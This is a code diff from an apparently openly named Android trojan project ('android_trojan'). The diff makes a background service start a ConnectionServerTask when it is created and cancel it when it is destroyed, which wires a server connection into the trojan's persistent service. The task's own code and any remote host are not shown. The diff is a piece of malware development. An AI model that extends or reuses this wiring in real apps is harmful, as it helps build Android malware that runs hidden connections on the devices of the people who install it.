@@ -8,6 +8,7 @@ import android.os.IBinder;
 import android.support.v4.app.NotificationCompat;
 import android.util.Log;
 
+import trojan.android.android_trojan.AsyncTask.ConnectionServerTask;
 import trojan.android.android_trojan.R;
 
 /**
@@ -15,6 +16,8 @@ import trojan.android.android_trojan.R;
  */
 public class BackgroundService extends Service {
     private static final String TAG = "BackgroundService";
+
+    private ConnectionServerTask connectionServerTask = new ConnectionServerTask();
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -27,11 +30,16 @@ public class BackgroundService extends Service {
         Log.d(TAG, "onCreate");
         showRecordingNotification();
 
+        connectionServerTask.execute();
+
+        Log.d(TAG, connectionServerTask.getStatus().toString());
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
+        connectionServerTask.cancel(true);
+        Log.d(TAG, connectionServerTask.getStatus().toString());
         Log.d(TAG, "onDestroy");
     }
 
